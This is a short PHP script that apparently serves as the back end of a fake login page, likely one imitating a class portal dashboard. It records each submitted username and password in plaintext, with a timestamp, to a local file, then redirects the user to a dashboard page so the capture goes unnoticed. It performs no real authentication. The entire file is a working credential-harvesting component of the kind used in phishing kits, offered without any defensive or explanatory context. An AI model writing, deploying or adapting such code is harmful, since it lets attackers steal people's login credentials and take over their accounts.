<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    if (!empty($username) && !empty($password)) {
        $timestamp = date('Y-m-d H:i:s');
        $data = "[$timestamp] Username: $username | Password: $password\n";
        
        file_put_contents('data_login.txt', $data, FILE_APPEND);
        
        $_SESSION['username'] = $username;
        
        header('Location: Dashboard _ CLASS-IPB.php');
        exit;
    }
}
?>
